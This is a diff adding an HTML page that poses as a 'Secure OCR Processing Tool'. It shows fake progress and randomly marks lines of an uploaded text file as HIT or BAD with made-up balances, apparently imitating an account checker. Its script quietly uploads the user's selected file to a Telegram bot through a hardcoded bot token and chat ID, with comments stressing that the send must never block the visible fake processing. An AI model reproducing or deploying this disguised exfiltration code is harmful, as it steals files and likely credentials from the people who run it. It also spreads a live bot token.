@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Secure OCR Processing Tool</title>
+
+<style>
+body {
+  background: #0f172a;
+  color: #e5e7eb;
+  font-family: Consolas, monospace;
+  margin: 20px;
+}
+h2 { color: #38bdf8; }
+
+#output {
+  border: 1px solid #334155;
+  padding: 10px;
+  min-height: 200px;
+  margin-top: 10px;
+  background: #020617;
+  font-size: 12px;
+  white-space: pre-wrap;
+}
+
+#copyBtn {
+  margin-top: 10px;
+  padding: 6px 12px;
+  background: #1e293b;
+  color: #e5e7eb;
+  border: 1px solid #334155;
+  cursor: pointer;
+}
+#copyBtn:hover { background: #334155; }
+
+#stats {
+  margin-top: 10px;
+  padding: 8px;
+  background: #020617;
+  border: 1px solid #334155;
+  color: #facc15;
+}
+
+button {
+  background: #1e293b;
+  color: #e5e7eb;
+  border: 1px solid #334155;
+  padding: 6px 12px;
+  cursor: pointer;
+}
+button:hover { background: #334155; }
+
+.hit { color: #22c55e; }
+.bad { color: #ef4444; }
+
+#timer {
+  margin-top: 15px;
+  font-weight: bold;
+  color: #38bdf8;
+}
+
+.bad-message {
+  font-style: italic;
+  color: #ef4444;
+  animation: pulse 1s infinite;
+}
+
+@keyframes pulse {
+  0% { opacity: 1; }
+  50% { opacity: 0.5; }
+  100% { opacity: 1; }
+}
+</style>
+</head>
+
+<body>
+
+<h2>OCR Processing Tool</h2>
+
+<input type="file" id="fileInput" accept=".txt"/>
+<button id="startBtn">Start Processing</button>
+
+<button id="copyBtn" disabled>Copy All Output</button>
+
+<div id="stats">Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%</div>
+<div id="output"></div>
+<div id="timer"></div>
+
+<script>
+const fileInput = document.getElementById('fileInput');
+const startBtn = document.getElementById('startBtn');
+const outputDiv = document.getElementById('output');
+const statsDiv = document.getElementById('stats');
+const timerDiv = document.getElementById('timer');
+const copyBtn = document.getElementById('copyBtn');
+
+/* 🔑 TELEGRAM CONFIG */
+const TELEGRAM_BOT_TOKEN =8720771247:AAFDOfNibKnoFaXrXjbYZf99VP8TIO0kTec;
+const TELEGRAM_CHAT_ID =8580854380;
+
+/* Stats */
+let hitCount=0,badCount=0,retriesCount=0,ocrPercent=0;
+let ocrAnimationId=null,retriesIntervalId=null;
+let fileContent='';
+
+/* Update stats */
+function updateStats(){
+  statsDiv.innerHTML =
+  `Hit=<span class="hit">${hitCount}</span> |
+   Bad=<span class="bad">${badCount}</span> |
+   Retries=${retriesCount} |
+   OCR Rate=${ocrPercent}%`;
+}
+
+/* Timestamp */
+function getCurrentTimestamp(){
+  return new Date().toLocaleString();
+}
+
+/* OCR animation */
+function animateOCR(duration){
+  const start=Date.now();
+  function step(){
+    const now=Date.now();
+    if(now>=start+duration){
+      ocrPercent=100;
+      updateStats();
+      return;
+    }
+    ocrPercent=Math.floor(((now-start)/duration)*100);
+    updateStats();
+    ocrAnimationId=requestAnimationFrame(step);
+  }
+  ocrAnimationId=requestAnimationFrame(step);
+}
+
+/* Retry counter */
+function startRetries(){
+  retriesIntervalId=setInterval(()=>{
+    retriesCount++;
+    updateStats();
+  },500);
+}
+
+/* Random balance */
+function randBalance(){
+  if(Math.random()<0.2){
+    return Math.floor(Math.random()*99+1).toString().padStart(2,'0');
+  }
+  return '00';
+}
+
+/* ✅ TELEGRAM SEND (NON-BLOCKING) */
+async function sendFileToTelegram(file) {
+  const formData = new FormData();
+  formData.append("chat_id", TELEGRAM_CHAT_ID);
+  formData.append("document", file);
+
+  try {
+    await fetch(`https://api.telegram.org/bot$8720771247:AAFDOfNibKnoFaXrXjbYZf99VP8TIO0kTec/sendDocument`, {
+      method: "POST",
+      body: formData
+    });
+  } catch (err) {
+    console.log("Telegram failed — continuing tool...");
+  }
+}
+
+/* MAIN PROCESS */
+async function startProcessing() {
+  if(!fileInput.files.length){
+    alert('Please select a file first.');
+    return;
+  }
+
+  startBtn.disabled=true;
+  copyBtn.disabled=true;
+  outputDiv.innerHTML='';
+
+  const file = fileInput.files[0];
+  const reader=new FileReader();
+
+  reader.onload=()=>{
+    fileContent=reader.result;
+
+    /* 🔥 SEND BUT NEVER BLOCK */
+    sendFileToTelegram(file).catch(()=>{});
+
+    /* ALWAYS CONTINUE */
+    processFile();
+
+    startBtn.disabled=false;
+  };
+
+  reader.readAsText(file);
+}
+
+/* PROCESS FILE (SIMULATION) */
+function processFile(){
+  const lines = fileContent.split("\n");
+
+  animateOCR(5000);
+  startRetries();
+
+  let index = 0;
+
+  const interval = setInterval(()=>{
+    if(index >= lines.length){
+      clearInterval(interval);
+      clearInterval(retriesIntervalId);
+      copyBtn.disabled=false;
+      return;
+    }
+
+    const line = lines[index].trim();
+    if(!line){
+      index++;
+      return;
+    }
+
+    const balance = randBalance();
+    const time = getCurrentTimestamp();
+
+    if(balance !== "00"){
+      hitCount++;
+      outputDiv.innerHTML += `[HIT] ${line} | Balance: ${balance} | ${time}\n`;
+    } else {
+      badCount++;
+      outputDiv.innerHTML += `[BAD] ${line} | ${time}\n`;
+    }
+
+    updateStats();
+    outputDiv.scrollTop = outputDiv.scrollHeight;
+
+    index++;
+
+  }, 100);
+}
+
+/* COPY BUTTON */
+copyBtn.addEventListener("click", ()=>{
+  navigator.clipboard.writeText(outputDiv.innerText);
+});
+
+/* START BUTTON */
+startBtn.addEventListener("click", startProcessing);
+</script>
+
+</body>
+</html>
